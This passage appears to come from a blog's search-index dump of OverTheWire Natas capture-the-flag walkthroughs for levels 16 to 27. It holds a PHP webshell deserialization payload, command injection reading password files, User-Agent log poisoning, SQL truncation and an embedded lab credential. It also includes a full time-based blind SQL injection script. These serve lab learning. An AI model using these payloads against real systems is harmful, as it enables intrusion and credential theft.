&amp;lt;?=`$_GET[1]`?&amp;gt;&quot;;That will create a php at “/img/natas26_randomname.php” with a small webshell that reads our commands from the GET request as “/?1={cmd}”.Taking out the tabs and doing a base64 encoding will result in “YToxOntpOjA7Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNjoiaW1nL25hdGFzMjZfcmFuZG9tbmFtZS5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czoyMToiPHByZT4gPD89YCRfR0VUWzFdYD8%2bIjt9fQ==”It should be noted that the variable names in our serialized data have null bytes included because they are private variables, and that’s how they have to be represented. Per stackoverflow: &amp;lt;name&amp;gt; is represented as s:&amp;lt;i&amp;gt;:&quot;&amp;lt;s&amp;gt;&quot;; where &amp;lt;i&amp;gt; is an integer representing the string length of &amp;lt;s&amp;gt;. But the values of &amp;lt;s&amp;gt; differs per visibility of properties: a. With public properties &amp;lt;s&amp;gt; is the simple name of the property. b. With protected properties, however, &amp;lt;s&amp;gt; is the simple name of the property, prepended with \\0*\\0 — an asterix, enclosed in two NUL characters (i.e. chr(0)). c. And with private properties, &amp;lt;s&amp;gt; is the simple name of the property, prepended with \\0&amp;lt;s&amp;gt;\\0 — &amp;lt;s&amp;gt;, enclosed in two NUL characters, where &amp;lt;s&amp;gt; is the fully qualified class name.There’s a couple of ways to get the NUL values encoded correctly. You could use a hex editor like “010 Editor” if you’re on Windows.Or if you’re on linux, use echo -n -e ‘a:1:{i:0;O:6:”Logger”:2:s:15:”\\0Logger\\0logFile”;s:26:”img/natas26_randomname.php”;s:15:”\\0Logger\\0exitMsg”;s:21:”&amp;lt;pre&amp;gt; ”;}}’ | base64That’s it! Try it with the command /?1=cat+/etc/natas_webpass/natas27. LEVEL 27The sourcecode:&amp;lt;?// morla / 10111// database gets cleared every 5 min /*CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL);*/function checkCredentials($link,$usr,$pass){ $user=mysql_real_escape_string($usr); $password=mysql_real_escape_string($pass); $query = &quot;SELECT username from users where username=&#39;$user&#39; and password=&#39;$password&#39; &quot;; $res = mysql_query($query, $link); if(mysql_num_rows($res) &amp;gt; 0){ return True; } return False;}function validUser($link,$usr){ $user=mysql_real_escape_string($usr); $query = &quot;SELECT * from users where username=&#39;$user&#39;&quot;; $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) &amp;gt; 0) { return True; } } return False;}function dumpData($link,$usr){ $user=mysql_real_escape_string($usr); $query = &quot;SELECT * from users where username=&#39;$user&#39;&quot;; $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) &amp;gt; 0) { while ($row = mysql_fetch_assoc($res)) { // thanks to Gobo for reporting this bug! //return print_r($row); return print_r($row,true); } } } return False;}function createUser($link, $usr, $pass){ $user=mysql_real_escape_string($usr); $password=mysql_real_escape_string($pass); $query = &quot;INSERT INTO users (username,password) values (&#39;$user&#39;,&#39;$password&#39;)&quot;; $res = mysql_query($query, $link); if(mysql_affected_rows() &amp;gt; 0){ return True; } return False;}if(array_key_exists(&quot;username&quot;, $_REQUEST) and array_key_exists(&quot;password&quot;, $_REQUEST)) { $link = mysql_connect(&#39;localhost&#39;, &#39;natas27&#39;, &#39;&amp;lt;censored&amp;gt;&#39;); mysql_select_db(&#39;natas27&#39;, $link); if(validUser($link,$_REQUEST[&quot;username&quot;])) { //user exists, check creds if(checkCredentials($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;])){ echo &quot;Welcome &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;!&amp;lt;br&amp;gt;&quot;; echo &quot;Here is your data:&amp;lt;br&amp;gt;&quot;; $data= ($link,$_REQUEST[&quot;username&quot;]); print htmlentities($data); } else{ echo &quot;Wrong password for user: &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;&amp;lt;br&amp;gt;&quot;; } } else { //user doesn&#39;t exist if(createUser($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;])){ echo &quot;User &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot; was created!&quot;; } } mysql_close($link);} else {?&amp;gt;&amp;lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;Username: &amp;lt;input name=&quot;username&quot;&amp;gt;&amp;lt;br&amp;gt;Password: &amp;lt;input name=&quot;password&quot; type=&quot;password&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;login&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;? } ?&amp;gt;This level has another username/password form request to break. It first checks to see if there are any users with the username provided, and if there is, it validates the credentials. Otherwise, it creates a user with the credentials provided. After a successful login, the credentials are printed out from an array:I thought this would end up being a SQL injection challenge since there are so many SQL queries in the source, but after a little experimentation and closer inspection of the code it became apparent that is not. All of the user inputs for the SQL queries are sanitized with mysql_real_escape_string(). Also, XSS is blocked by all of the outputs being sanitized by htmlentities(). This code seems pretty secure and I went down several rabbit-holes trying to figure out where the weakness is. Even studied getting around mysql_real_escape_string() with encoding errors, but that doesn’t apply here. It is kind of obvious the challenge is supposed to be solved by tricking the dumpData() function into dumping “natas28”.Eventually I had to cheat (I know, I know it’s crappy). The solution I found is really quite clever and I feel dumb for not seeing it and in the future I’ll remember that feeling when considering to cheat or not.Turns out there are a couple of weaknesses that when exploited together can bypass the login.Firstly, dumpData() has a ‘while’ statement that allows dumping of multiple users if they are in the SQL result. Under normal operations that wouldn’t happen.Secondly, MySQL doesn’t count trailing spaces when doing a comparison.Thirdly, we can send a username to createUser() that is longer than the 64 bytes given to the ‘username’ field and it will be truncated, but accepted.Putting that together, we can get createUser() to create one with a username of natas28 with a bunch of spaces appended to it, so it will pass the validUser() comparison. The last character can’t be a space because we need the first validUser() check to fail, so it will create our exploit user. The length of the username has to be greater than 64 bytes, so the last character (that isn’t a space) will be truncated and the end result in the database will seem to be “natas28” to the comparisons. Then login with “natas28” and the password sent to createUser().Here is an example:Create the username with python -c “print(‘natas28’ + ‘+’*57 + ‘1’)” and login.And the login:" }, { "title": "OverTheWire: NATAS 21 &amp;#8211; 25", "url": "/posts/overthewire-natas-21/", "categories": "Walkthrough, OverTheWire", "tags": "web", "date": "2019-09-16 14:49:55 -0400", "snippet": "LEVEL 21This level has a second site associated with it, where all the action is:Main SitePHP sourcecode of the main page:&amp;lt;?function print_credentials() { if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) { print &quot;You are an admin. The credentials for the next level are:&amp;lt;br&amp;gt;&quot;; print &quot;&amp;lt;pre&amp;gt;Username: natas22\\n&quot;; print &quot;Password: &amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&quot;; } else { print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.&quot;; }}session_start();print_credentials();?&amp;gt;The main site needs “admin” session variable set to 1 for us to get the next password.Experimenter SiteThe PHP sourcecode of the experimenter page:&amp;lt;? session_start();// if update was submitted, store itif(array_key_exists(&quot;submit&quot;, $_REQUEST)) { foreach($_REQUEST as $key =&amp;gt; $val) { $_SESSION[$key] = $val; }}if(array_key_exists(&quot;debug&quot;, $_GET)) { print &quot;[DEBUG] Session contents:&amp;lt;br&amp;gt;&quot;; print_r($_SESSION);}// only allow these keys$validkeys = array(&quot;align&quot; =&amp;gt; &quot;center&quot;, &quot;fontsize&quot; =&amp;gt; &quot;100%&quot;, &quot;bgcolor&quot; =&amp;gt; &quot;yellow&quot;);$form = &quot;&quot;;$form .= &#39;&amp;lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;&#39;;foreach($validkeys as $key =&amp;gt; $defval) { $val = $defval; if(array_key_exists($key, $_SESSION)) { $val = $_SESSION[$key]; } else { $_SESSION[$key] = $val; } $form .= &quot;$key: &amp;lt;input name=&#39;$key&#39; value=&#39;$val&#39; /&amp;gt;&amp;lt;br&amp;gt;&quot;;}$form .= &#39;&amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&amp;gt;&#39;;$form .= &#39;&amp;lt;/form&amp;gt;&#39;;$style = &quot;background-color: &quot;.$_SESSION[&quot;bgcolor&quot;].&quot;; text-align: &quot;.$_SESSION[&quot;align&quot;].&quot;; font-size: &quot;.$_SESSION[&quot;fontsize&quot;].&quot;;&quot;;$example = &quot;&amp;lt;div style=&#39;$style&#39;&amp;gt;Hello world!&amp;lt;/div&amp;gt;&quot;;?&amp;gt;&amp;lt;p&amp;gt;Example:&amp;lt;/p&amp;gt;&amp;lt;?=$example?&amp;gt;&amp;lt;p&amp;gt;Change example values here:&amp;lt;/p&amp;gt;&amp;lt;?=$form?&amp;gt;The first thing I noticed on the experimenter site is the use of “DEBUG” variable again, so I immediately set it for future use. When looking at the requests in Burp, I noticed the request for the main site and the experimenter site have different PHPSESSION cookie values, so that may be a problem when we’re trying to set “admin=1” for the main site.There’s a line in the source that sets some HTML with values we have control over, so maybe we can inject HTML.$form .= “$key: &amp;lt;input name=’$key’ value=’$val’ /&amp;gt;”;Tested an injection of ‘ /&amp;gt;admin:&amp;lt;input name=’admin’ value=’1 on the “bgcolor” value. Success with the injection!To use the debug flag while we submit the form, put it all in the address bar like “/index.php?debug&amp;amp;align=center&amp;amp;fontsize=100%25&amp;amp;bgcolor=yellow%27%20/%3E%3Cbr%3Eadmin:%3Cinput%20name=%27admin%27%20value=%271&amp;amp;submit=Update”Looking at the page source for this is pretty revealing:&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.overthewire.org/wargames/natas/level.css&quot;&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;natas21 - CSS style experimenter&amp;lt;/h1&amp;gt;&amp;lt;div id=&quot;content&quot;&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Note: this website is colocated with &amp;lt;a href=&quot;http://natas21.natas.labs.overthewire.org&quot;&amp;gt;http://natas21.natas.labs.overthewire.org&amp;lt;/a&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;[DEBUG] Session contents:&amp;lt;br&amp;gt;Array( [align] =&amp;gt; center [fontsize] =&amp;gt; 100% [bgcolor] =&amp;gt; yellow&#39; /&amp;gt;&amp;lt;br&amp;gt;admin:&amp;lt;input name=&#39;admin&#39; value=&#39;1 [debug] =&amp;gt; [submit] =&amp;gt; Update)&amp;lt;p&amp;gt;Example:&amp;lt;/p&amp;gt;&amp;lt;div style=&#39;background-color: yellow&#39; /&amp;gt;&amp;lt;br&amp;gt;admin:&amp;lt;input name=&#39;admin&#39; value=&#39;1; text-align: center; font-size: 100%;&#39;&amp;gt;Hello world!&amp;lt;/div&amp;gt;&amp;lt;p&amp;gt;Change example values here:&amp;lt;/p&amp;gt;&amp;lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;align: &amp;lt;input name=&#39;align&#39; value=&#39;center&#39; /&amp;gt;&amp;lt;br&amp;gt;fontsize: &amp;lt;input name=&#39;fontsize&#39; value=&#39;100%&#39; /&amp;gt;&amp;lt;br&amp;gt;bgcolor: &amp;lt;input name=&#39;bgcolor&#39; value=&#39;yellow&#39; /&amp;gt;&amp;lt;br&amp;gt;admin:&amp;lt;input name=&#39;admin&#39; value=&#39;1&#39; /&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;div id=&quot;viewsource&quot;&amp;gt;&amp;lt;a href=&quot;index-source.html&quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;From looking at the debug output, it looks like can modify our injection to get placed into the session array instead of the HTML. It’s a little easier to do within Burp Repeater than it would be in the browser:Success! Notice how &quot;[admin] =&amp;gt; 1&quot; is injected into the session array.All we should have to do is then change the PHPSESSID of the main site to this one and reload. Just load the main site request into Repeater and change the PHPSESSID value, then Send… BUT IT DOESN’T WORK!!Maybe we DO have to inject the value first into the HTML to set it into the Session Array.Since we have to interact with the ‘Update’ button on the page, use the browser for this part. Use the HTML injection from earlier for the “bgcolor” value, yellow’ /&amp;gt;admin:&amp;lt;input name=’admin’ value=’1, then press the ‘Update’ button. When you get the response, the HTML should be changed to include our admin value. Then press ‘Update’ once more to add the values into the Session Array.Check that it worked by using the Burp Repeater again on the main site, don’t forget to change the PHPSESSID value to the experimenter site!AWESOME! It worked! LEVEL 22This level is almost completely blank on the HTML, only a link to the sourcecode! Let’s see it…&amp;lt;?session_start();if(array_key_exists(&quot;revelio&quot;, $_GET)) { // only admins can reveal the password if(!($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1)) { header(&quot;Location: /&quot;); }}?&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;!-- This stuff in the header has nothing to do with the level --&amp;gt;&amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&amp;gt;&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&amp;gt;&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&amp;gt;&amp;lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;var wechallinfo = { &quot;level&quot;: &quot;natas22&quot;, &quot;pass&quot;: &quot;&amp;lt;censored&amp;gt;&quot; };&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;natas22&amp;lt;/h1&amp;gt;&amp;lt;div id=&quot;content&quot;&amp;gt;&amp;lt;? if(array_key_exists(&quot;revelio&quot;, $_GET)) { print &quot;You are an admin. The credentials for the next level are:&amp;lt;br&amp;gt;&quot;; print &quot;&amp;lt;pre&amp;gt;Username: natas23\\n&quot;; print &quot;Password: &amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&quot;; }?&amp;gt;This time it is checking for a variable &#39;revelio&#39;. And that’s ALL it’s checking for!! This level must be a Harry Potter joke.Sure enough, that’s all it needed!Doing this from the browser doesn’t get the same results though, because there’s a redirect, “Location: /”. LEVEL 23Here we only have a password entry form.Password:&amp;lt;form name=&quot;input&quot; method=&quot;get&quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;passwd&quot; size=20&amp;gt; &amp;lt;input type=&quot;submit&quot; value=&quot;Login&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;?php if(array_key_exists(&quot;passwd&quot;,$_REQUEST)){ if(strstr($_REQUEST[&quot;passwd&quot;],&quot;iloveyou&quot;) &amp;amp;&amp;amp; ($_REQUEST[&quot;passwd&quot;] &amp;gt; 10 )){ echo &quot;&amp;lt;br&amp;gt;The credentials for the next level are:&amp;lt;br&amp;gt;&quot;; echo &quot;&amp;lt;pre&amp;gt;Username: natas24 Password: &amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&quot;; } else{ echo &quot;&amp;lt;br&amp;gt;Wrong!&amp;lt;br&amp;gt;&quot;; } } // morla / 10111?&amp;gt;Looks like the function strstr() is being used to search a variable ‘passwd’ for the phrase “iloveyou”. The only other check is that ‘passwd’ equals a number greater than 10. So there is a check for a number, and a check for a string. It appears that putting a mathematical operator in the second check must force it to treat the string as a number, dropping off the invalid non-numerical characters. Because “11iloveyou” works!! LEVEL 24This is another password input form just like the last level. Here is the sourcecode for this one:&amp;lt;?php if(array_key_exists(&quot;passwd&quot;,$_REQUEST)){ if(!strcmp($_REQUEST[&quot;passwd&quot;],&quot;&amp;lt;censored&amp;gt;&quot;)){ echo &quot;&amp;lt;br&amp;gt;The credentials for the next level are:&amp;lt;br&amp;gt;&quot;; echo &quot;&amp;lt;pre&amp;gt;Username: natas25 Password: &amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&quot;; } else{ echo &quot;&amp;lt;br&amp;gt;Wrong!&amp;lt;br&amp;gt;&quot;; } } // morla / 10111?&amp;gt;This password check is using strcmp() this time. Go straight to the manual page to see if there’s anything interesting about it. The first thing that catches my eye is the return values. “Returns &amp;lt; 0 if str1 is less than str2; &amp;gt; 0 if str1 is greater than str2, and 0 if they are equal. ”This is used in a boolean check, so “0” means False. There is a NOT operator on the strcmp(), so that would mean a “0” result means True now. The way to get the intended result is if the strings are equal. We’re probably not going to just guess the password, so maybe there is something else we can exploit in the return values.One of the comments on the manual page is interesting: &amp;lt;span class=&quot;html&quot;&amp;gt;strcmp() will return NULL on failure.&amp;lt;/span&amp;gt; This has the side effect of equating to a match when using an equals comparison (==).Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return. ———————Example——————— $variable1 = array();$ans === strcmp($variable1, $variable2); This will stop $ans from returning a match; Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.Getting it to return NULL might give us a useful side effect. In the example in the comment, the variable is assigned an array to get a failure. So to force the ‘passwd’ variable to an array, put in /?passwd[]=something for the query. That returns an error message and success! LEVEL 25This level starts out with a block of text that gets replaced when you change the language setting.Sourcecode:&amp;lt;?php // cheers and &amp;lt;3 to malvina // - morla function setLanguage(){ /* language setup */ if(array_key_exists(&quot;lang&quot;,$_REQUEST)) if(safeinclude(&quot;language/&quot; . $_REQUEST[&quot;lang&quot;] )) return 1; safeinclude(&quot;language/en&quot;); } function safeinclude($filename){ // check for directory traversal if(strstr($filename,&quot;../&quot;)){ logRequest(&quot;Directory traversal attempt! fixing request.&quot;); $filename=str_replace(&quot;../&quot;,&quot;&quot;,$filename); } // dont let ppl steal our passwords if(strstr($filename,&quot;natas_webpass&quot;)){ logRequest(&quot;Illegal file access detected! Aborting!&quot;); exit(-1); } // add more checks... if (file_exists($filename)) { include($filename); return 1; } return 0; } function listFiles($path){ $listoffiles=array(); if ($handle = opendir($path)) while (false !== ($file = readdir($handle))) if ($file != &quot;.&quot; &amp;amp;&amp;amp; $file != &quot;..&quot;) $listoffiles[]=$file; closedir($handle); return $listoffiles; } function logRequest($message){ $log=&quot;[&quot;. date(&quot;d.m.Y H::i:s&quot;,time()) .&quot;]&quot;; $log=$log . &quot; &quot; . $_SERVER[&#39;HTTP_USER_AGENT&#39;]; $log=$log . &quot; \\&quot;&quot; . $message .&quot;\\&quot;\\n&quot;; $fd=fopen(&quot;/var/www/natas/natas25/logs/natas25_&quot; . session_id() .&quot;.log&quot;,&quot;a&quot;); fwrite($fd,$log); fclose($fd); }?&amp;gt;&amp;lt;h1&amp;gt;natas25&amp;lt;/h1&amp;gt;&amp;lt;div id=&quot;content&quot;&amp;gt;&amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;form&amp;gt;&amp;lt;select name=&#39;lang&#39; onchange=&#39;this.form.submit()&#39;&amp;gt;&amp;lt;option&amp;gt;language&amp;lt;/option&amp;gt;&amp;lt;?php foreach(listFiles(&quot;language/&quot;) as $f) echo &quot;&amp;lt;option&amp;gt;$f&amp;lt;/option&amp;gt;&quot;; ?&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;?php session_start(); setLanguage(); echo &quot;&amp;lt;h2&amp;gt;$__GREETING&amp;lt;/h2&amp;gt;&quot;; echo &quot;&amp;lt;p align=\\&quot;justify\\&quot;&amp;gt;$__MSG&quot;; echo &quot;&amp;lt;div align=\\&quot;right\\&quot;&amp;gt;&amp;lt;h6&amp;gt;$__FOOTER&amp;lt;/h6&amp;gt;&amp;lt;div&amp;gt;&quot;;?&amp;gt;&amp;lt;p&amp;gt;Looking at the source there are a couple of things that jump out at me. First is the homegrown checks on input for the language file. Those checks can probably be gotten around. Also there is a logfile getting written to that may be vulnerable to a stored XSS type of attack.Objective 1Try to get around the checks on the included language file.I started out with getting one of the checks to fail, to see what would happen and to create the log file, using /?lang=/../logs/natas25_g2ouhkp80fj036rpalvnpb9l13.log There was no obvious result on the response page, but maybe the log file was created.Next I tried /?lang=/…/./logs/natas25_g2ouhkp80fj036rpalvnpb9l13.log. Important point being the “../” was removed from “/…/./”, leaving “/../” correctly in place.I get the expected log output as:[19.09.2019 12::52:19] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 &quot;Directory traversal attempt! fixing request.&quot;[19.09.2019 12::54:32] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 &quot;Directory traversal attempt! fixing request.&quot;Objective 2Get around the check for “natas_webpass”.Stored XSS is likely possible on the log file using the User-Agent string, since that gets saved. Injecting some PHP that reads “natas_webpass” should bypass the check on our variable.Write “User-Agent: &amp;lt;?php include(“/etc/natas_webpass/natas26″); ?&amp;gt;” into the HTTP header using Burp Repeater:[19.09.2019 12::52:19] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 &quot;Directory traversal attempt! fixing request.&quot;[19.09.2019 12::54:32] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 &quot;Directory traversal attempt! fixing request.&quot;[19.09.2019 12::56:21] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 &quot;Directory traversal attempt! fixing request.&quot;[19.09.2019 13::05:45] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T33 &quot;Directory traversal attempt! fixing request.&quot;Success!! " }, { "title": "OverTheWire: NATAS 16 &amp;#8211; 20", "url": "/posts/overthewire-natas-16/", "categories": "Walkthrough, OverTheWire", "tags": "web", "date": "2019-09-13 15:22:13 -0400", "snippet": "LEVEL 16This level looks a lot like level 9 did with the dictionary lookup and it suggests there are now more input checks. Let’s see the source:&amp;lt;form&amp;gt;Find words containing: &amp;lt;input name=needle&amp;gt;&amp;lt;input type=submit name=submit value=Search&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/form&amp;gt;Output:&amp;lt;?$key = &quot;&quot;;if(array_key_exists(&quot;needle&quot;, $_REQUEST)) { $key = $_REQUEST[&quot;needle&quot;];}if($key != &quot;&quot;) { if(preg_match(&#39;/[;|&amp;amp;`\\&#39;&quot;]/&#39;,$key)) { print &quot;Input contains an illegal character!&quot;; } else { passthru(&quot;grep -i \\&quot;$key\\&quot; dictionary.txt&quot;); }}?&amp;gt;If you put the same query as level 9 $(cat /etc/natas_webpass/natas17 1&amp;gt;/proc/$$/fd/1) into the Search field, it doesn’t work. However, if you put it directly into the address bar after “index.php?” it still works! It’s also pretty obvious this wasn’t the intended way to solve the challenge, but those are the most fun ways, amirite? LEVEL 17This level is a lot like level 15, however, it gives no output at all, ever! Looking at the source code shows that the output fields are just completely commented out.The source:&amp;lt;?/*CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL);*/if(array_key_exists(&quot;username&quot;, $_REQUEST)) { $link = mysql_connect(&#39;localhost&#39;, &#39;natas17&#39;, &#39;&amp;lt;censored&amp;gt;&#39;); mysql_select_db(&#39;natas17&#39;, $link); $query = &quot;SELECT * from users where username=\\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\\&quot;&quot;; if(array_key_exists(&quot;debug&quot;, $_GET)) { echo &quot;Executing query: $query&amp;lt;br&amp;gt;&quot;; } $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) &amp;gt; 0) { //echo &quot;This user exists.&amp;lt;br&amp;gt;&quot;; } else { //echo &quot;This user doesn&#39;t exist.&amp;lt;br&amp;gt;&quot;; } } else { //echo &quot;Error in query.&amp;lt;br&amp;gt;&quot;; } mysql_close($link);} else {?&amp;gt;&amp;lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;Username: &amp;lt;input name=&quot;username&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;? } ?&amp;gt;That means there’s no straightforward way to extract information about the password. Situations like this is a totally blind SQL injection. Basically, we have to use some kind of side-channel information, like the time it takes to load the page. It can be tested with a SQLi query like ” OR IF(1=1,SLEEP(5),null)# where you can see how the response takes much longer to arrive.Rewriting the script from level 15 to measure the website’s response time as the indicator should work.#!/usr/bin/python3## main execution script for solving natas17 on OverTheWire.org# based on https://gist.github.com/Bengman/e14a4b5f1b592ee06961import requestsimport time# Get start timestart_time = time.time()# All possible charactersallChars = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;# Characters usedusedChars = &#39;&#39;# Final Passwordpassword = &#39;&#39;# Our target URLtarget = &quot;http://natas17.natas.labs.overthewire.org&quot;headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101&#39;, &#39;Authorization&#39;: &#39;Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==&#39;,}def send_query(query): payload = {&#39;username&#39;: query} print(&quot;Payload: &quot; + str(payload)) response = requests.post(target + &#39;/index.php?&#39;, data=payload, headers=headers, timeout=1) return responser = requests.get(target, headers=headers)if r.status_code != requests.codes.ok: raise ValueError(&#39;Couldn\\&#39;t connect to target :(&#39;)else: print(&#39;Target reachable. Starting character parsing...&#39;)# figure out which chars are neededprint(&quot;Getting list of characters used...&quot;)for c in allChars: print(&quot;Trying Character: &quot; + c) try: resp = send_query(&#39;natas18&quot; and if(password LIKE BINARY &quot;%&#39;+c+&#39;%&quot;, sleep(5), null)#&#39;) except requests.exceptions.Timeout: # If we got a timeout, the character exists usedChars += c print(&quot;Character found: &quot; + c)print(&quot;Characters used: &quot; + usedChars)# retrieve the password one char at a timefor i in range(1, 33): print(&quot;Testing password...&quot;) for c in usedChars: print(&quot;Trying Character: &quot; + c) try: resp = send_query(&#39;natas18&quot; and if(ascii(substring((select password from users where username=&quot;natas18&quot;),%d,1))=%s, sleep(3), 1) #&#39; % (i, ord(c))) except requests.exceptions.Timeout: password += c print(&quot;Found character: &quot; + c) print(&quot;Password so far: &quot; + password) breakprint(&#39;Password: &#39; + password)print(&quot;--- %s seconds ---&quot; % (time.time() - start_time)) LEVEL 18sourcecode:&amp;lt;?$maxid = 640; // 640 should be enough for everyonefunction isValidAdminLogin() { if($_REQUEST[&quot;username&quot;] == &quot;admin&quot;) { /* This method of authentication appears to be unsafe and has been disabled for now. */ //return 1; } return 0;}function isValidID($id) { return is_numeric($id);}function createID($user) { global $maxid; return rand(1, $maxid);}function debug($msg) { if(array_key_exists(&quot;debug&quot;, $_GET)) { print &quot;DEBUG: $msg&amp;lt;br&amp;gt;&quot;; }}function my_session_start() { if(array_key_exists(&quot;PHPSESSID&quot;, $_COOKIE) and isValidID($_COOKIE[&quot;PHPSESSID&quot;])) { if(!session_start()) { debug(&quot;Session start failed&quot;); return false; } else { debug(&quot;Session start ok&quot;); if(!array_key_exists(&quot;admin&quot;, $_SESSION)) { debug(&quot;Session was old: admin flag set&quot;); $_SESSION[&quot;admin&quot;] = 0; // backwards compatible, secure } return true; } } return false;}function print_credentials() { if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) { print &quot;You are an admin. The credentials for the next level are:&amp;lt;br&amp;gt;&quot;; print &quot;&amp;lt;pre&amp;gt;Username: natas19\\n&quot;; print &quot;Password: &amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&quot;; } else { print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;; }}$showform = true;if(my_session_start()) { print_credentials(); $showform = false;} else { if(array_key_exists(&quot;username&quot;, $_REQUEST) &amp;amp;&amp;amp; array_key_exists(&quot;password&quot;, $_REQUEST)) { session_id(createID($_REQUEST[&quot;username&quot;])); session_start(); $_SESSION[&quot;admin&quot;] = isValidAdminLogin(); debug(&quot;New session started&quot;); $showform = false; print_credentials(); }} if($showform) {?&amp;gt;&amp;lt;p&amp;gt;Please login with your admin account to retrieve credentials for natas19.&amp;lt;/p&amp;gt;&amp;lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&amp;gt;Username: &amp;lt;input name=&quot;username&quot;&amp;gt;&amp;lt;br&amp;gt;Password: &amp;lt;input name=&quot;password&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;? } ?&amp;gt;This level is apparently designed to give us the password for the next level if we have a flag “admin” equal to 1. The code where “admin” is updated has been commented out, so we’re going to have to go about it another way. Notice at the top of the sourcecode is gives us a limit to the session id, 640. That suggests it’s incremental, and we can hijack an admin session by guessing the session id.This is the code I used for the bruteforcing.#!/usr/bin/python3# Script to brute force level 18 of natas challenges# Library to work with the POST requestsimport requests# Good message to search forgstr = &quot;Password&quot;# Our target URLtarget = 